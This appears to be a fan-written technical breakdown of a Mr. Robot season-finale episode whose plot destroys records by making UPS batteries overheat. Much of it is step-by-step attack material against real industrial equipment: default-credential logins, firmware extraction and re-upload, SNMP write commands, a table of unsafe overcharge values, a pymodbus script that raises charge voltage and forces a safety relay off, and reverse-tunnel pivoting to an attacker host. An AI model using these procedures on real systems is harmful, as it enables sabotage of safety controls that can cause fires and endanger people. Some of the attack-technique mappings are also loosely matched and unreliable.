# Season 2, Episode 12 (Season Finale): eps2.9_pyth0n-pt2.p7z

## Episode Overview

The Season 2 finale reveals the devastating scope of the conspiracy: Stage 2 is not just a data hack but a plan for physical destruction. The fsociety/Dark Army operation aims to destroy the physical paper records that E Corp has been using to rebuild its financial database after the 5/9 hack. The mechanism is terrifyingly plausible: manipulating UPS (Uninterruptible Power Supply) firmware to cause thermal runaway in battery systems, leading to fires and explosions at E Corp's paper record storage facility. This episode connects cyber attacks to physical destruction in a way that directly parallels Stuxnet, demonstrating how compromising industrial control systems can have real-world kinetic effects.

---

## Hacks & Techniques

### 1. Stage 2 Revealed: UPS Firmware Manipulation

The core of Stage 2 is modifying the firmware of UPS (Uninterruptible Power Supply) systems at the E Corp paper record storage facility to cause the batteries to enter thermal runaway -- essentially turning the backup power systems into incendiary devices.

**What Is a UPS:**

A UPS is a device that provides emergency power when the main power source fails. Large facilities like data centers and record storage buildings use industrial-grade UPS systems with large battery arrays (lead-acid or lithium-ion).

**UPS Components:**

```
[Utility Power] --> [Rectifier/Charger] --> [Battery Bank] --> [Inverter] --> [Critical Load]
                          |                      |                |
                    [Converts AC to DC]    [Stores energy]  [Converts DC to AC]
                          |                      |
                    [Charges batteries]    [Battery Management
                                            System (BMS)]
```

**Battery Management System (BMS):**

The BMS is a critical safety component that:
- Monitors individual cell voltages
- Controls charge/discharge rates
- Monitors temperature
- Prevents overcharging (which causes thermal runaway)
- Prevents deep discharge (which damages batteries)
- Triggers safety shutoffs if parameters exceed safe limits

**The Attack: Firmware Modification to Override Safety Systems:**

```
Normal UPS Operation:
Battery Temperature Rising -> BMS Detects -> Reduces Charge Rate -> Safety Maintained

Compromised UPS Operation:
Battery Temperature Rising -> Modified BMS Ignores -> Continues Charging -> Thermal Runaway

Thermal Runaway Sequence:
1. Overcharging heats battery cells
2. Heat causes chemical decomposition of electrolyte
3. Decomposition produces gas, further raising temperature
4. Positive feedback loop: heat -> more decomposition -> more heat
5. Cell venting / rupture
6. Possible fire or explosion
7. Cascading failure to adjacent cells
8. Facility fire
```

**Firmware Modification Process:**

```bash
# Step 1: Identify the UPS management interface
nmap -sV -p 80,443,161,162,22,23 ups_management_ip

# Step 2: Access UPS management card (often has default credentials)
# Common UPS management cards: APC Network Management Card, Eaton,
# Liebert/Vertiv, CyberPower

# APC default credentials: apc/apc
curl http://ups_management_ip/logon.htm

# Step 3: Download current firmware
# Many UPS management cards support firmware upload via web interface or FTP
ftp ups_management_ip
# Login: apc/apc
# get firmware.bin

# Step 4: Analyze and modify firmware
binwalk -e firmware.bin
# Look for BMS parameters, charge voltage limits, temperature thresholds

# Step 5: Modify safety parameters
# Change maximum charge voltage from safe limit to dangerous level
# Disable temperature-based charge cutoff
# Disable over-voltage protection
# Remove thermal shutdown triggers

# Step 6: Upload modified firmware
# Via web interface, FTP, or SNMP
curl -X POST http://ups_management_ip/firmware_upload \
  -F "file=@modified_firmware.bin" \
  -u apc:apc

# Step 7: The modified firmware overrides safety controls
# Batteries are charged beyond safe limits
# Temperature monitoring is disabled or falsified
# Thermal runaway occurs
```

### 2. SCADA/ICS Exploitation

Stage 2 involves compromising Industrial Control Systems (ICS) and potentially SCADA (Supervisory Control and Data Acquisition) systems that manage building infrastructure.

**ICS/SCADA Architecture:**

```
                    +------------------+
                    |  Corporate IT    |
                    |  Network         |
                    +--------+---------+
                             |
                    +--------+---------+
                    |  DMZ / Firewall  |  <-- Network pivot point
                    +--------+---------+
                             |
                    +--------+---------+
                    |  OT Network      |
                    |  (Operational    |
                    |   Technology)    |
                    +--------+---------+
                      /      |       \
              +------+  +----+----+  +------+
              | HMI  |  | SCADA   |  | Hist |
              |      |  | Server  |  | orian|
              +------+  +----+----+  +------+
                             |
                    +--------+---------+
                    |  Control Network |
                    +--------+---------+
                      /      |       \
              +------+  +----+----+  +------+
              | PLC  |  | RTU    |  | UPS  |
              |      |  |        |  | Mgmt |
              +------+  +--------+  +------+
                  |          |          |
              [Valves]   [Sensors]  [Batteries]
              [Motors]   [Meters]   [Power]
```

**Common ICS/SCADA Protocols:**

| Protocol | Port | Purpose | Security |
|---|---|---|---|
| Modbus TCP | 502 | PLC communication | No authentication, no encryption |
| DNP3 | 20000 | Utility SCADA | Optional authentication (SA) |
| OPC UA | 4840 | Industrial data exchange | Supports encryption and auth |
| BACnet | 47808 | Building automation | Minimal security |
| EtherNet/IP | 44818 | Industrial Ethernet | No built-in security |
| S7comm | 102 | Siemens PLC | No authentication |
| SNMP | 161/162 | Network management (UPS) | Community strings often default |

**Attacking UPS via SNMP:**

```bash
# Scan for SNMP-enabled UPS systems
nmap -sU -p 161 --script snmp-info 10.0.0.0/24

# Enumerate UPS information via SNMP
snmpwalk -v2c -c public ups_ip 1.3.6.1.4.1.318
# OID 1.3.6.1.4.1.318 = APC enterprise OID

# Read UPS battery status
snmpget -v2c -c public ups_ip 1.3.6.1.4.1.318.1.1.1.2.2.1.0
# upsAdvBatteryCapacity

# Read battery temperature
snmpget -v2c -c public ups_ip 1.3.6.1.4.1.318.1.1.1.2.2.2.0
# upsAdvBatteryTemperature

# WRITE (if community string allows) -- modify charge parameters
snmpset -v2c -c private ups_ip 1.3.6.1.4.1.318.1.1.1.5.2.1.0 i 1
# This could modify UPS operating parameters if write access is available

# Exploit default SNMP community strings
# public (read-only), private (read-write) are the most common defaults
```

### 3. Network Pivoting from IT to OT

A critical aspect of Stage 2 is the pivot from E Corp's corporate IT network to the Operational Technology (OT) network that controls building systems including UPS management.

**Pivoting Techniques:**

```bash
# From compromised IT workstation, scan for OT network segments
# OT networks are often on different subnets

# Identify dual-homed machines (connected to both IT and OT)
# These are the pivot points
arp -a
route print
netstat -rn

# Use compromised machine as a proxy
# SSH tunnel through pivot host
ssh -L 4840:ot_scada_server:4840 user@pivot_host
# Now localhost:4840 connects to the SCADA server

# Metasploit pivoting
# Add route through compromised session
meterpreter> run autoroute -s 10.10.0.0/16
meterpreter> run autoroute -p

# SOCKS proxy through Meterpreter
meterpreter> use auxiliary/server/socks_proxy
meterpreter> set SRVPORT 1080
meterpreter> run

# Then use proxychains to route tools through the pivot
proxychains nmap -sT -p 502,4840,47808,161 10.10.0.0/24
```

**Why IT/OT Convergence Is Dangerous:**

Historically, OT networks were completely isolated ("air-gapped") from IT networks and the internet. Over the past two decades, organizations have connected these networks for:
- Remote monitoring and management
- Data collection and analytics
- Cost savings (shared infrastructure)
- Convenience

This convergence has created attack paths from the internet through corporate IT networks into OT systems that control physical processes -- exactly the path exploited in Stage 2.

### 4. Default Credentials in ICS Devices

ICS/SCADA devices are notorious for default credentials. Unlike IT systems where password policies are enforced, industrial systems often retain factory defaults for years or decades.

**Common Default Credentials:**

| Device/System | Username | Password |
|---|---|---|
| APC UPS Network Management Card | apc | apc |
| Eaton UPS | admin | admin |
| Schneider Electric SCADA | USER | USER |
| Siemens S7 PLC | (no auth) | (no auth) |
| Allen-Bradley PLC | admin | (blank) |
| GE SCADA | Administrator | (blank) |
| Honeywell Building Automation | admin | admin |
| ABB RTU | admin | admin |

**Why Defaults Persist:**

- OT systems are rarely updated due to uptime requirements
- Changing passwords may require vendor involvement
- Legacy systems may not support password changes
- "It's on the OT network, so it's safe" (security through obscurity)
- Regulatory and certification concerns about modifying systems
- Lack of OT security expertise in many organizations

### 5. Firmware Modification to Override Battery Charging Safety

The specific technical mechanism of Stage 2 involves modifying the firmware that controls battery charging parameters.

**Battery Charging Safety Parameters:**

```
Normal Battery Charging Profile (Lead-Acid):
+--------------------------------------------------+
| Parameter          | Safe Value | Attack Value    |
|--------------------+------------+-----------------|
| Max Charge Voltage | 13.8V/cell | 16.0V/cell     |
| Float Voltage      | 13.2V/cell | 15.5V/cell     |
| Max Charge Current | C/10       | C/2 or higher  |
| Max Temperature    | 45C cutoff | Disabled        |
| Thermal Comp.      | -3mV/C     | Disabled        |
| Overcharge Protect | Enabled    | Disabled        |
| Vent Alarm         | Enabled    | Disabled        |
+--------------------------------------------------+

Modified firmware changes:
- Charge voltage raised above gassing threshold
- Temperature monitoring disabled or spoofed
- Overcurrent protection removed
- Safety shutdown bypassed
- Management interface reports "normal" to prevent alerts
```

**Thermal Runaway Physics:**

For lead-acid batteries (common in large UPS):
1. Overcharging causes electrolysis of water in the electrolyte
2. This generates hydrogen and oxygen gas (explosive mixture)
3. Increased internal resistance causes heating
4. Heat increases chemical reaction rates
5. More heat leads to more gas and more heat (positive feedback)
6. Cell casing ruptures, venting flammable gases
7. Any ignition source causes fire or explosion

For lithium-ion batteries (modern UPS):
1. Overcharging causes lithium plating on the anode
2. Dendrite growth can short internal layers
3. Internal short generates intense heat (500C+)
4. Electrolyte decomposes, releasing flammable gases
5. Cell goes into thermal runaway (self-sustaining reaction)
6. Adjacent cells are heated, triggering cascading failure
7. The entire battery array can be consumed in minutes

### 6. Stuxnet Parallels

Stage 2 is a direct parallel to Stuxnet, the most famous cyberweapon ever deployed.

**Stuxnet (2010):**

| Stuxnet | Stage 2 |
|---|---|
| Targeted Iran's Natanz uranium enrichment facility | Targets E Corp paper record storage |
| Modified PLC firmware controlling centrifuges | Modifies UPS firmware controlling battery charging |
| Caused centrifuges to spin at destructive speeds | Causes batteries to overcharge to destructive levels |
| While reporting normal operation to operators | While reporting normal status to monitoring systems |
| Physical destruction through cyber means | Physical destruction (fire) through cyber means |
| Joint US/Israel operation (Olympic Games) | fsociety/Dark Army operation |
| Spread via USB and network shares | Spread via network exploitation from IT to OT |

**Stuxnet Technical Details:**

- Used four zero-day exploits (Windows)
- Spread via USB drives and network shares
- Targeted Siemens S7-300 PLCs with specific configurations
- Modified the frequency converter drives controlling centrifuge motors
- Caused centrifuges to alternate between 1410 Hz and 2 Hz (far outside normal 1064 Hz)
- Simultaneously replayed recorded "normal" sensor data to the SCADA system
- Destroyed approximately 1,000 centrifuges at Natanz

### 7. Whiterose's Power Plant and Nation-State Operations

The season finale hints at Whiterose's larger plan involving the Washington Township power plant. This connects to themes of nation-state cyber operations and the manipulation of critical infrastructure.

**Nation-State Cyber Operations Against Critical Infrastructure:**

```
Tier 1: Espionage and Reconnaissance
├── Map critical infrastructure networks
├── Identify vulnerabilities in ICS/SCADA systems
├── Plant persistent backdoors for future use
└── Collect intelligence on defensive capabilities

Tier 2: Preparation
├── Develop custom malware for target ICS platforms
├── Test attacks against identical equipment in labs
├── Pre-position access in target networks
└── Establish command and control infrastructure

Tier 3: Attack Execution
├── Activate pre-positioned access
├── Modify industrial process parameters
├── Override safety systems
├── Cause physical damage while masking indicators
└── Maintain plausible deniability
```

**Known Nation-State Attacks on Critical Infrastructure:**

- **Stuxnet (2010)**: US/Israel against Iranian nuclear program
- **BlackEnergy/Industroyer (2015-2016)**: Russia against Ukrainian power grid (caused blackouts)
- **Triton/TRISIS (2017)**: Targeted safety instrumented systems at a Saudi petrochemical plant -- the first malware designed to defeat the last line of defense against industrial catastrophe
- **Colonial Pipeline (2021)**: DarkSide ransomware caused the shutdown of the largest fuel pipeline in the US

---

## Tools Used

| Tool | Purpose |
|---|---|
| **binwalk** | Firmware extraction and analysis |
| **Ghidra / IDA Pro** | Firmware reverse engineering |
| **Nmap** | Network scanning and service discovery |
| **Metasploit** | Exploitation and pivoting framework |
| **SNMP tools (snmpwalk, snmpset)** | UPS and ICS device interaction |
| **Modbus tools** | PLC communication |
| **Wireshark** | Protocol analysis for ICS traffic |
| **OpenOCD / JTAG** | Direct firmware extraction from hardware |
| **proxychains** | Routing tools through pivot hosts |
| **Python + pymodbus** | Custom ICS exploitation scripts |

---

## Commands Shown

**ICS/SCADA Reconnaissance:**

```bash
# Scan for ICS devices on the OT network
nmap -sV -p 502,4840,47808,20000,44818,102,161 10.10.0.0/24

# Identify UPS management interfaces
nmap -sV -p 80,443,22,23,161 --script http-title 10.10.1.0/24

# Enumerate Modbus devices
nmap -p 502 --script modbus-discover 10.10.0.0/24

# Use Metasploit for ICS scanning
msfconsole -q -x "
use auxiliary/scanner/scada/modbusdetect;
set RHOSTS 10.10.0.0/24;
run;
"
```

**UPS Firmware Manipulation:**

```bash
# Extract firmware from UPS management card
# Via FTP (APC example)
ftp ups_management_ip
> binary
> get apc_hw05_aos_670.bin
> get apc_hw05_sumx_670.bin
> bye

# Analyze firmware structure
binwalk apc_hw05_aos_670.bin
binwalk -e apc_hw05_aos_670.bin

# Examine extracted filesystem
find _apc_hw05_aos_670.bin.extracted/ -type f | head -20

# Look for configuration files with safety parameters
grep -r "voltage" _apc_hw05_aos_670.bin.extracted/
grep -r "temperature" _apc_hw05_aos_670.bin.extracted/
grep -r "charge" _apc_hw05_aos_670.bin.extracted/

# After modification, re-upload firmware
curl -X POST https://ups_management_ip/firmware \
  -u apc:apc \
  -F "firmware=@modified_firmware.bin" \
  --insecure
```

**Modbus Communication for ICS Interaction:**

```python
# Python script to interact with ICS via Modbus
from pymodbus.client import ModbusTcpClient

# Connect to PLC/controller
client = ModbusTcpClient('10.10.0.50', port=502)
client.connect()

# Read holding registers (device parameters)
result = client.read_holding_registers(address=0, count=10, slave=1)
if not result.isError():
    print(f"Registers: {result.registers}")

# DANGEROUS: Write to a register (modify setpoint)
# This could change a physical process parameter
client.write_register(address=40001, value=1600, slave=1)
# Example: Setting charge voltage to 16.00V (dangerous)

# Read coils (digital outputs)
coils = client.read_coils(address=0, count=8, slave=1)
print(f"Safety relay status: {coils.bits}")

# DANGEROUS: Force a coil (override safety relay)
client.write_coil(address=5, value=False, slave=1)
# Disabling safety shutdown relay

client.close()
```

**Network Pivoting Commands:**

```bash
# Discover OT network from compromised IT host
# Look for routes to OT subnets
ip route
arp -a | grep "10.10."

# Set up SSH tunnel to reach OT network
ssh -D 1080 user@pivot_host
# Then configure tools to use SOCKS proxy at localhost:1080

# Using chisel for pivoting (no SSH required)
# On attacker:
./chisel server --reverse --port 8000

# On compromised host:
./chisel client attacker_ip:8000 R:socks

# Scan OT network through the tunnel
proxychains nmap -sT -Pn -p 502,161,80,443 10.10.0.0/24
```

---

## Real-World Parallels

### Stuxnet: The Original Cyber-Physical Weapon

Stuxnet remains the most significant parallel to Stage 2:

- **Discovered in 2010** by security researchers at VirusBlokAda (Belarus) and analyzed extensively by Symantec and Kaspersky
- **Jointly developed by the US (NSA/CIA) and Israel (Unit 8200)** under the codename "Olympic Games"
- **Used unprecedented technical sophistication**: Four zero-day exploits, stolen code-signing certificates from Realtek and JMicron, and deep knowledge of Siemens S7-300/S7-400 PLCs
- **Demonstrated that cyberattacks can cause physical destruction**: Approximately 1,000 IR-1 centrifuges were destroyed
- **Changed the geopolitical landscape**: Proved that critical infrastructure could be attacked through cyberspace, launching a new era of cyber warfare

### UPS and Battery Safety Incidents

- **Samsung Galaxy Note 7 (2016)**: Battery design flaws caused thermal runaway in consumer phones, leading to fires on aircraft and a complete product recall. This demonstrated how battery management failures can have catastrophic results.

- **Boeing 787 Dreamliner Battery Fires (2013)**: Lithium-ion battery failures in the auxiliary power unit caused fires, grounding the entire 787 fleet worldwide. The root cause was related to battery charging and management system issues.

- **Tesla Battery Fires**: Multiple incidents of thermal runaway in electric vehicle battery packs, demonstrating the energy density and danger of modern battery systems.

- **Data Center UPS Failures**: Large UPS systems in data centers have caused significant fires. In 2012, a UPS failure at a Visa data center caused a 9-hour outage affecting millions of transactions.

### Triton/TRISIS: The Most Dangerous Real-World Parallel

The Triton malware (discovered in 2017) is perhaps the most alarming real-world parallel to Stage 2:

- **Target**: A Saudi Arabian petrochemical plant's Schneider Electric Triconex Safety Instrumented System (SIS)
- **Purpose**: The SIS is the LAST line of defense that prevents industrial catastrophes (explosions, toxic releases)
- **Attack**: Triton modified the SIS firmware to either disable safety functions or prevent them from triggering during a dangerous condition
- **Implication**: If successful, the attackers could have caused a real explosion or toxic release while the safety systems failed to respond
- **Attribution**: Linked to the Central Scientific Research Institute of Chemistry and Mechanics (TsNIIKhM) in Moscow, Russia
- **Direct parallel to Stage 2**: Both attacks target safety systems to cause physical destruction

### ICS/SCADA Security Reality

- **According to CISA and ICS-CERT**, thousands of vulnerabilities in industrial control systems are disclosed annually, many with default credentials as the primary risk
- **The Purdue Model** (which defines the levels of separation between IT and OT) is often poorly implemented, with direct paths from the internet to control systems
- **Shodan searches** routinely reveal internet-exposed ICS devices, including UPS management interfaces, building automation systems, and even nuclear facility systems
- **The Department of Energy's Idaho National Laboratory** conducts research on ICS cybersecurity and has demonstrated the destruction of physical equipment through cyber means (the Aurora Generator Test in 2007 destroyed a 27-ton diesel generator by hacking its protective relay)

### The Aurora Generator Test (2007)

The US Department of Energy's Idaho National Laboratory conducted a classified experiment (later partially declassified) that directly demonstrates the Stage 2 concept:

- Researchers remotely accessed a diesel generator's protective relay
- They sent commands that rapidly opened and closed the generator's breakers
- This caused the generator to go out of sync with the power grid
- The resulting mechanical stress destroyed the 27-ton generator
- The experiment proved that cyberattacks could cause physical destruction of power equipment
- Video of the test shows the generator shaking violently before components fly off and it begins to smoke

This is exactly the type of cyber-physical attack that Stage 2 represents -- using software manipulation to override safety systems and cause physical destruction.

---

## Tool Links

| Tool | Link |
|---|---|
| Nmap | https://nmap.org/ |
| Metasploit | https://www.metasploit.com/ |
| Wireshark | https://www.wireshark.org/ |
| Shodan | https://www.shodan.io/ |
| pymodbus | https://github.com/pymodbus-dev/pymodbus |
| Modbus tools | https://www.modbustools.com/ |

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| UPS firmware manipulation | T1565 | Data Manipulation | https://attack.mitre.org/techniques/T1565/ |
| Public-facing application exploit (UPS web interface) | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| Default credentials in ICS | T1110 | Brute Force | https://attack.mitre.org/techniques/T1110/ |
| Network service discovery (ICS scan) | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Data/physical equipment destruction | T1485 | Data Destruction | https://attack.mitre.org/techniques/T1485/ |
| Disk wipe / physical destruction | T1561 | Disk Wipe | https://attack.mitre.org/techniques/T1561/ |
| Impair defenses (override safety systems) | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |
| Network boundary bridging (IT to OT pivot) | T1599 | Network Boundary Bridging | https://attack.mitre.org/techniques/T1599/ |
| Compromise infrastructure (pre-positioning) | T1584 | Compromise Infrastructure | https://attack.mitre.org/techniques/T1584/ |
| Privilege escalation via exploit | T1068 | Exploitation for Privilege Escalation | https://attack.mitre.org/techniques/T1068/ |
| System shutdown/reboot (thermal runaway) | T1529 | System Shutdown/Reboot | https://attack.mitre.org/techniques/T1529/ |

---

## References and Further Reading

- **Stuxnet Analysis - Symantec W32.Stuxnet Dossier**: Comprehensive technical analysis of the Stuxnet worm targeting Iranian nuclear centrifuges.
- **CVE-2010-2568** (Stuxnet LNK exploit): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568
- **CVE-2010-2729** (Stuxnet print spooler exploit): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2729
- **Triton/TRISIS Malware Analysis (2017)**: FireEye/Mandiant analysis of the first malware targeting safety instrumented systems.
- **Aurora Generator Test (2007)**: Idaho National Laboratory demonstration of cyber-physical destruction of power equipment.
- **CISA ICS-CERT Advisories**: https://www.cisa.gov/uscert/ics - Regular advisories on ICS/SCADA vulnerabilities.
- **SANS ICS Security Summit**: Annual conference presentations on ICS/SCADA security threats and defenses.
- **BlackEnergy/Industroyer Analysis**: ESET and Dragos analyses of the malware used in Ukrainian power grid attacks (2015-2016).
- **DEF CON ICS Village**: Hands-on demonstrations of ICS/SCADA exploitation at DEF CON.
- **Colonial Pipeline Ransomware Incident (2021)**: Analysis of the DarkSide ransomware attack that shut down the largest US fuel pipeline.

---

## Search Tags

```
tags: [stuxnet, ics, scada, ups, firmware, thermal-runaway, modbus, pymodbus, nmap, metasploit, snmp, plc, cyber-physical, critical-infrastructure, triton, stage2, battery, industrial-control-systems]
season: 2
episode: 12
mitre: [T1565, T1190, T1110, T1046, T1485, T1561, T1562, T1599, T1584, T1068, T1529]
```
